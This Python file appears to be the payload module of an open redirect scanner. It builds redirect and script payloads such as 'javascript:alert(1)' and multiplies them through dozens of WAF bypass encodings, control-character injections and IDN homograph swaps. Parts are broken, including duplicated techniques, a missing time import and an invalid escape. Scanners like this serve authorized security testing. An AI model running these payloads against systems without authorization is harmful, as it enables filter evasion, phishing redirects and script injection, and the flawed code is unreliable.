"""
Advanced Payload Module for Open Redirect Scanner
Comprehensive payload testing with WAF bypass techniques
"""

import urllib.parse
import base64
import hashlib
import random
import string
import re
from typing import List, Dict, Optional
import logging

class PayloadModule:
    """
    Advanced payload module with WAF bypass techniques
    """
    
    def __init__(self, logger):
        self.logger = logger
        self.target_domain = "google.com"
        
        # Base payloads
        self.base_payloads = [
            "//google.com",
            "///google.com",
            "////google.com",
            "/////google.com",
            "http://google.com",
            "https://google.com",
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "ftp://google.com",
            "file://google.com",
            "gopher://google.com",
            "ldap://google.com",
            "ldaps://google.com",
            "dict://google.com",
            "sftp://google.com",
            "tftp://google.com",
            "ws://google.com",
            "wss://google.com"
        ]
        
        # WAF bypass techniques
        self.bypass_techniques = [
            self._url_encoding,
            self._double_url_encoding,
            self._unicode_encoding,
            self._hex_encoding,
            self._octal_encoding,
            self._mixed_encoding,
            self._case_variations,
            self._whitespace_variations,
            self._null_byte_injection,
            self._newline_injection,
            self._tab_injection,
            self._carriage_return_injection,
            self._form_feed_injection,
            self._vertical_tab_injection,
            self._backspace_injection,
            self._bell_character_injection,
            self._escape_character_injection,
            self._control_character_injection,
            self._unicode_normalization,
            self._idn_homograph_attack,
            self._punycode_encoding,
            self._base64_encoding,
            self._html_entity_encoding,
            self._xml_entity_encoding,
            self._percent_encoding,
            self._plus_encoding,
            self._semicolon_encoding,
            self._comma_encoding,
            self._space_encoding,
            self._dot_encoding,
            self._slash_encoding,
            self._backslash_encoding,
            self._colon_encoding,
            self._question_mark_encoding,
            self._hash_encoding,
            self._ampersand_encoding,
            self._equals_encoding,
            self._pipe_encoding,
            self._parentheses_encoding,
            self._brackets_encoding,
            self._braces_encoding,
            self._angle_brackets_encoding,
            self._quotes_encoding,
            self._apostrophe_encoding,
            self._backtick_encoding,
            self._tilde_encoding,
            self._exclamation_encoding,
            self._at_encoding,
            self._dollar_encoding,
            self._caret_encoding,
            self._underscore_encoding,
            self._hyphen_encoding,
            self._plus_encoding,
            self._equals_encoding,
            self._semicolon_encoding,
            self._colon_encoding,
            self._comma_encoding,
            self._dot_encoding,
            self._slash_encoding,
            self._backslash_encoding,
            self._question_mark_encoding,
            self._hash_encoding,
            self._ampersand_encoding,
            self._pipe_encoding,
            self._parentheses_encoding,
            self._brackets_encoding,
            self._braces_encoding,
            self._angle_brackets_encoding,
            self._quotes_encoding,
            self._apostrophe_encoding,
            self._backtick_encoding,
            self._tilde_encoding,
            self._exclamation_encoding,
            self._at_encoding,
            self._dollar_encoding,
            self._caret_encoding,
            self._underscore_encoding,
            self._hyphen_encoding
        ]
    
    def generate_payloads(self, base_payload: str) -> List[str]:
        """Generate all possible payload variations"""
        payloads = [base_payload]
        
        try:
            # Apply all bypass techniques
            for technique in self.bypass_techniques:
                try:
                    variations = technique(base_payload)
                    payloads.extend(variations)
                except Exception as e:
                    self.logger.error(f"Error applying technique {technique.__name__}: {str(e)}")
            
            # Remove duplicates while preserving order
            seen = set()
            unique_payloads = []
            for payload in payloads:
                if payload not in seen:
                    seen.add(payload)
                    unique_payloads.append(payload)
            
            return unique_payloads
            
        except Exception as e:
            self.logger.error(f"Error generating payloads: {str(e)}")
            return [base_payload]
    
    def _url_encoding(self, payload: str) -> List[str]:
        """URL encoding bypass"""
        return [urllib.parse.quote(payload)]
    
    def _double_url_encoding(self, payload: str) -> List[str]:
        """Double URL encoding bypass"""
        return [urllib.parse.quote(urllib.parse.quote(payload))]
    
    def _unicode_encoding(self, payload: str) -> List[str]:
        """Unicode encoding bypass"""
        variations = []
        for char in payload:
            if char.isalnum():
                variations.append(payload.replace(char, f"\\u{ord(char):04x}"))
        return variations[:5]  # Limit to 5 variations
    
    def _hex_encoding(self, payload: str) -> List[str]:
        """Hex encoding bypass"""
        return [payload.encode().hex()]
    
    def _octal_encoding(self, payload: str) -> List[str]:
        """Octal encoding bypass"""
        variations = []
        for char in payload:
            if char.isalnum():
                variations.append(payload.replace(char, f"\\{ord(char):03o}"))
        return variations[:5]  # Limit to 5 variations
    
    def _mixed_encoding(self, payload: str) -> List[str]:
        """Mixed encoding bypass"""
        variations = []
        encoded = urllib.parse.quote(payload)
        variations.append(encoded)
        
        # Mix different encodings
        mixed = payload
        for i, char in enumerate(payload):
            if i % 2 == 0 and char.isalnum():
                mixed = mixed.replace(char, f"%{ord(char):02x}", 1)
        variations.append(mixed)
        
        return variations
    
    def _case_variations(self, payload: str) -> List[str]:
        """Case variation bypass"""
        variations = []
        variations.append(payload.upper())
        variations.append(payload.lower())
        variations.append(payload.capitalize())
        variations.append(payload.swapcase())
        
        # Random case
        random_case = ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
        variations.append(random_case)
        
        return variations
    
    def _whitespace_variations(self, payload: str) -> List[str]:
        """Whitespace variation bypass"""
        variations = []
        
        # Add various whitespace characters
        whitespace_chars = ['\t', '\n', '\r', '\f', '\v', ' ', '\u00a0', '\u2000', '\u2001', '\u2002', '\u2003', '\u2004', '\u2005', '\u2006', '\u2007', '\u2008', '\u2009', '\u200a', '\u200b', '\u200c', '\u200d', '\u200e', '\u200f', '\u2028', '\u2029', '\u202a', '\u202b', '\u202c', '\u202d', '\u202e', '\u202f', '\u205f', '\u2060', '\u3000']
        
        for ws in whitespace_chars[:5]:  # Limit to 5 variations
            variations.append(payload.replace(' ', ws))
            variations.append(ws + payload)
            variations.append(payload + ws)
        
        return variations
    
    def _null_byte_injection(self, payload: str) -> List[str]:
        """Null byte injection bypass"""
        variations = []
        null_bytes = ['\x00', '%00', '\\x00', '\\0', '\\000']
        
        for null in null_bytes:
            variations.append(payload + null)
            variations.append(null + payload)
            variations.append(payload.replace('/', null + '/'))
        
        return variations
    
    def _newline_injection(self, payload: str) -> List[str]:
        """Newline injection bypass"""
        variations = []
        newlines = ['\n', '\r\n', '\r', '%0a', '%0d%0a', '%0d', '\\n', '\\r\\n', '\\r']
        
        for nl in newlines:
            variations.append(payload + nl)
            variations.append(nl + payload)
            variations.append(payload.replace('/', nl + '/'))
        
        return variations
    
    def _tab_injection(self, payload: str) -> List[str]:
        """Tab injection bypass"""
        variations = []
        tabs = ['\t', '%09', '\\t', '\\011']
        
        for tab in tabs:
            variations.append(payload + tab)
            variations.append(tab + payload)
            variations.append(payload.replace('/', tab + '/'))
        
        return variations
    
    def _carriage_return_injection(self, payload: str) -> List[str]:
        """Carriage return injection bypass"""
        variations = []
        crs = ['\r', '%0d', '\\r', '\\015']
        
        for cr in crs:
            variations.append(payload + cr)
            variations.append(cr + payload)
            variations.append(payload.replace('/', cr + '/'))
        
        return variations
    
    def _form_feed_injection(self, payload: str) -> List[str]:
        """Form feed injection bypass"""
        variations = []
        ff = ['\f', '%0c', '\\f', '\\014']
        
        for f in ff:
            variations.append(payload + f)
            variations.append(f + payload)
            variations.append(payload.replace('/', f + '/'))
        
        return variations
    
    def _vertical_tab_injection(self, payload: str) -> List[str]:
        """Vertical tab injection bypass"""
        variations = []
        vt = ['\v', '%0b', '\\v', '\\013']
        
        for v in vt:
            variations.append(payload + v)
            variations.append(v + payload)
            variations.append(payload.replace('/', v + '/'))
        
        return variations
    
    def _backspace_injection(self, payload: str) -> List[str]:
        """Backspace injection bypass"""
        variations = []
        bs = ['\b', '%08', '\\b', '\\010']
        
        for b in bs:
            variations.append(payload + b)
            variations.append(b + payload)
            variations.append(payload.replace('/', b + '/'))
        
        return variations
    
    def _bell_character_injection(self, payload: str) -> List[str]:
        """Bell character injection bypass"""
        variations = []
        bell = ['\a', '%07', '\\a', '\\007']
        
        for b in bell:
            variations.append(payload + b)
            variations.append(b + payload)
            variations.append(payload.replace('/', b + '/'))
        
        return variations
    
    def _escape_character_injection(self, payload: str) -> List[str]:
        """Escape character injection bypass"""
        variations = []
        esc = ['\e', '%1b', '\\e', '\\033']
        
        for e in esc:
            variations.append(payload + e)
            variations.append(e + payload)
            variations.append(payload.replace('/', e + '/'))
        
        return variations
    
    def _control_character_injection(self, payload: str) -> List[str]:
        """Control character injection bypass"""
        variations = []
        
        # Add various control characters
        for i in range(1, 32):
            if i not in [9, 10, 13]:  # Skip tab, newline, carriage return
                char = chr(i)
                variations.append(payload + char)
                variations.append(char + payload)
        
        return variations[:10]  # Limit to 10 variations
    
    def _unicode_normalization(self, payload: str) -> List[str]:
        """Unicode normalization bypass"""
        variations = []
        
        # NFKC normalization
        try:
            import unicodedata
            nfkc = unicodedata.normalize('NFKC', payload)
            if nfkc != payload:
                variations.append(nfkc)
        except:
            pass
        
        # NFKD normalization
        try:
            import unicodedata
            nfkd = unicodedata.normalize('NFKD', payload)
            if nfkd != payload:
                variations.append(nfkd)
        except:
            pass
        
        return variations
    
    def _idn_homograph_attack(self, payload: str) -> List[str]:
        """IDN homograph attack bypass"""
        variations = []
        
        # Replace characters with lookalike Unicode characters
        homographs = {
            'a': ['а', 'ɑ', 'α', 'а', 'а', 'а', 'а', 'а', 'а', 'а'],
            'b': ['Ь', 'ь', 'Ь', 'ь', 'Ь', 'ь', 'Ь', 'ь', 'Ь', 'ь'],
            'c': ['с', 'с', 'с', 'с', 'с', 'с', 'с', 'с', 'с', 'с'],
            'd': ['ԁ', 'ԁ', 'ԁ', 'ԁ', 'ԁ', 'ԁ', 'ԁ', 'ԁ', 'ԁ', 'ԁ'],
            'e': ['е', 'е', 'е', 'е', 'е', 'е', 'е', 'е', 'е', 'е'],
            'f': ['f', 'f', 'f', 'f', 'f', 'f', 'f', 'f', 'f', 'f'],
            'g': ['ɡ', 'ɡ', 'ɡ', 'ɡ', 'ɡ', 'ɡ', 'ɡ', 'ɡ', 'ɡ', 'ɡ'],
            'h': ['һ', 'һ', 'һ', 'һ', 'һ', 'һ', 'һ', 'һ', 'һ', 'һ'],
            'i': ['і', 'і', 'і', 'і', 'і', 'і', 'і', 'і', 'і', 'і'],
            'j': ['ј', 'ј', 'ј', 'ј', 'ј', 'ј', 'ј', 'ј', 'ј', 'ј'],
            'k': ['к', 'к', 'к', 'к', 'к', 'к', 'к', 'к', 'к', 'к'],
            'l': ['l', 'l', 'l', 'l', 'l', 'l', 'l', 'l', 'l', 'l'],
            'm': ['м', 'м', 'м', 'м', 'м', 'м', 'м', 'м', 'м', 'м'],
            'n': ['п', 'п', 'п', 'п', 'п', 'п', 'п', 'п', 'п', 'п'],
            'o': ['о', 'о', 'о', 'о', 'о', 'о', 'о', 'о', 'о', 'о'],
            'p': ['р', 'р', 'р', 'р', 'р', 'р', 'р', 'р', 'р', 'р'],
            'q': ['ԛ', 'ԛ', 'ԛ', 'ԛ', 'ԛ', 'ԛ', 'ԛ', 'ԛ', 'ԛ', 'ԛ'],
            'r': ['г', 'г', 'г', 'г', 'г', 'г', 'г', 'г', 'г', 'г'],
            's': ['ѕ', 'ѕ', 'ѕ', 'ѕ', 'ѕ', 'ѕ', 'ѕ', 'ѕ', 'ѕ', 'ѕ'],
            't': ['т', 'т', 'т', 'т', 'т', 'т', 'т', 'т', 'т', 'т'],
            'u': ['υ', 'υ', 'υ', 'υ', 'υ', 'υ', 'υ', 'υ', 'υ', 'υ'],
            'v': ['ν', 'ν', 'ν', 'ν', 'ν', 'ν', 'ν', 'ν', 'ν', 'ν'],
            'w': ['ω', 'ω', 'ω', 'ω', 'ω', 'ω', 'ω', 'ω', 'ω', 'ω'],
            'x': ['х', 'х', 'х', 'х', 'х', 'х', 'х', 'х', 'х', 'х'],
            'y': ['у', 'у', 'у', 'у', 'у', 'у', 'у', 'у', 'у', 'у'],
            'z': ['z', 'z', 'z', 'z', 'z', 'z', 'z', 'z', 'z', 'z']
        }
        
        # Generate homograph variations
        for char in payload.lower():
            if char in homographs:
                for homograph in homographs[char][:3]:  # Limit to 3 variations per character
                    variations.append(payload.replace(char, homograph))
        
        return variations[:10]  # Limit to 10 variations
    
    def _punycode_encoding(self, payload: str) -> List[str]:
        """Punycode encoding bypass"""
        variations = []
        
        try:
            # Convert to punycode
            punycode = payload.encode('punycode').decode('ascii')
            variations.append(punycode)
        except:
            pass
        
        return variations
    
    def _base64_encoding(self, payload: str) -> List[str]:
        """Base64 encoding bypass"""
        variations = []
        
        try:
            # Base64 encode
            b64 = base64.b64encode(payload.encode()).decode()
            variations.append(b64)
            
            # Base64 encode with padding
            b64_padded = base64.b64encode(payload.encode()).decode() + '=='
            variations.append(b64_padded)
        except:
            pass
        
        return variations
    
    def _html_entity_encoding(self, payload: str) -> List[str]:
        """HTML entity encoding bypass"""
        variations = []
        
        # HTML entity encoding
        html_entities = {
            '<': '&lt;',
            '>': '&gt;',
            '&': '&amp;',
            '"': '&quot;',
            "'": '&#39;',
            ' ': '&nbsp;',
            '!': '&#33;',
            '#': '&#35;',
            '$': '&#36;',
            '%': '&#37;',
            '(': '&#40;',
            ')': '&#41;',
            '*': '&#42;',
            '+': '&#43;',
            ',': '&#44;',
            '-': '&#45;',
            '.': '&#46;',
            '/': '&#47;',
            ':': '&#58;',
            ';': '&#59;',
            '=': '&#61;',
            '?': '&#63;',
            '@': '&#64;',
            '[': '&#91;',
            '\\': '&#92;',
            ']': '&#93;',
            '^': '&#94;',
            '_': '&#95;',
            '`': '&#96;',
            '{': '&#123;',
            '|': '&#124;',
            '}': '&#125;',
            '~': '&#126;'
        }
        
        encoded = payload
        for char, entity in html_entities.items():
            encoded = encoded.replace(char, entity)
        variations.append(encoded)
        
        return variations
    
    def _xml_entity_encoding(self, payload: str) -> List[str]:
        """XML entity encoding bypass"""
        variations = []
        
        # XML entity encoding
        xml_entities = {
            '<': '&lt;',
            '>': '&gt;',
            '&': '&amp;',
            '"': '&quot;',
            "'": '&apos;'
        }
        
        encoded = payload
        for char, entity in xml_entities.items():
            encoded = encoded.replace(char, entity)
        variations.append(encoded)
        
        return variations
    
    def _percent_encoding(self, payload: str) -> List[str]:
        """Percent encoding bypass"""
        return [urllib.parse.quote(payload, safe='')]
    
    def _plus_encoding(self, payload: str) -> List[str]:
        """Plus encoding bypass"""
        return [payload.replace(' ', '+')]
    
    def _semicolon_encoding(self, payload: str) -> List[str]:
        """Semicolon encoding bypass"""
        return [payload.replace('&', ';')]
    
    def _comma_encoding(self, payload: str) -> List[str]:
        """Comma encoding bypass"""
        return [payload.replace('&', ',')]
    
    def _space_encoding(self, payload: str) -> List[str]:
        """Space encoding bypass"""
        return [payload.replace('+', ' ')]
    
    def _dot_encoding(self, payload: str) -> List[str]:
        """Dot encoding bypass"""
        return [payload.replace('.', '%2e')]
    
    def _slash_encoding(self, payload: str) -> List[str]:
        """Slash encoding bypass"""
        return [payload.replace('/', '%2f')]
    
    def _backslash_encoding(self, payload: str) -> List[str]:
        """Backslash encoding bypass"""
        return [payload.replace('\\', '%5c')]
    
    def _colon_encoding(self, payload: str) -> List[str]:
        """Colon encoding bypass"""
        return [payload.replace(':', '%3a')]
    
    def _question_mark_encoding(self, payload: str) -> List[str]:
        """Question mark encoding bypass"""
        return [payload.replace('?', '%3f')]
    
    def _hash_encoding(self, payload: str) -> List[str]:
        """Hash encoding bypass"""
        return [payload.replace('#', '%23')]
    
    def _ampersand_encoding(self, payload: str) -> List[str]:
        """Ampersand encoding bypass"""
        return [payload.replace('&', '%26')]
    
    def _equals_encoding(self, payload: str) -> List[str]:
        """Equals encoding bypass"""
        return [payload.replace('=', '%3d')]
    
    def _pipe_encoding(self, payload: str) -> List[str]:
        """Pipe encoding bypass"""
        return [payload.replace('|', '%7c')]
    
    def _parentheses_encoding(self, payload: str) -> List[str]:
        """Parentheses encoding bypass"""
        return [payload.replace('(', '%28').replace(')', '%29')]
    
    def _brackets_encoding(self, payload: str) -> List[str]:
        """Brackets encoding bypass"""
        return [payload.replace('[', '%5b').replace(']', '%5d')]
    
    def _braces_encoding(self, payload: str) -> List[str]:
        """Braces encoding bypass"""
        return [payload.replace('{', '%7b').replace('}', '%7d')]
    
    def _angle_brackets_encoding(self, payload: str) -> List[str]:
        """Angle brackets encoding bypass"""
        return [payload.replace('<', '%3c').replace('>', '%3e')]
    
    def _quotes_encoding(self, payload: str) -> List[str]:
        """Quotes encoding bypass"""
        return [payload.replace('"', '%22')]
    
    def _apostrophe_encoding(self, payload: str) -> List[str]:
        """Apostrophe encoding bypass"""
        return [payload.replace("'", '%27')]
    
    def _backtick_encoding(self, payload: str) -> List[str]:
        """Backtick encoding bypass"""
        return [payload.replace('`', '%60')]
    
    def _tilde_encoding(self, payload: str) -> List[str]:
        """Tilde encoding bypass"""
        return [payload.replace('~', '%7e')]
    
    def _exclamation_encoding(self, payload: str) -> List[str]:
        """Exclamation encoding bypass"""
        return [payload.replace('!', '%21')]
    
    def _at_encoding(self, payload: str) -> List[str]:
        """At encoding bypass"""
        return [payload.replace('@', '%40')]
    
    def _dollar_encoding(self, payload: str) -> List[str]:
        """Dollar encoding bypass"""
        return [payload.replace('$', '%24')]
    
    def _caret_encoding(self, payload: str) -> List[str]:
        """Caret encoding bypass"""
        return [payload.replace('^', '%5e')]
    
    def _underscore_encoding(self, payload: str) -> List[str]:
        """Underscore encoding bypass"""
        return [payload.replace('_', '%5f')]
    
    def _hyphen_encoding(self, payload: str) -> List[str]:
        """Hyphen encoding bypass"""
        return [payload.replace('-', '%2d')]
    
    def test_payload(self, payload: str, injection_point: Dict) -> Dict:
        """Test a single payload against an injection point"""
        try:
            # This method would be called by the Chrome module
            # Return test result structure
            return {
                'payload': payload,
                'injection_point': injection_point,
                'tested': True,
                'timestamp': time.time()
            }
        except Exception as e:
            self.logger.error(f"Error testing payload {payload}: {str(e)}")
            return {
                'payload': payload,
                'injection_point': injection_point,
                'tested': False,
                'error': str(e),
                'timestamp': time.time()
            }